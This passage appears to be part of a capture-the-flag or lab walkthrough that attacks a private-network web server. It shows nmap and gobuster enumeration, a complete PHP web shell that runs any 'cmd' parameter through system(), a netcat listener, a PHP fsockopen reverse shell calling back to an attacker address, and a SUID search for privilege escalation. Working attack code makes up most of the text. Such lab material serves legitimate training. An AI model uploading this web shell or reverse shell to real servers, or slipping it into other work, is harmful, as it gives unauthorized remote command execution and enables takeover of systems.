`nmap 192.168.100.0/24`

Continue by using _Gobuster_ to try and dig deeper into the website and it's directories to find out more information about it.

`gobuster dir -u http://192.168.100.100 -w /usr/share/wordlists/dirb/common.txt`

_Endpoint_ in the form of "_/upload.php_, which could indicate a potential vulnerability if the upload functionality is not properly secured, as it might allow an attacker to upload and execute malicious files, leading to further exploitation of the server.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Continue by going back to the terminal window to start a listener

`nc -lvp 2222`
Now, let's use this script to gain a reverse shell using the simple web-based command execution interface we created earlier.
```php
php -r '$sock=fsockopen("192.168.100.101",2222);exec("/bin/bash <&3 >&3 2>&3");'
```

Now, using `sudo -l` we can see if there's any sort of `sudo` command we can run in order to escalate privileges to root.
Let's check if the SUID bit is set for the find command by using the command `find / -perm -4000 2>/dev/null`
Looking at the output, it confirms that the SUID bit is indeed set. Meaning we can use the find command to escalate privileges.
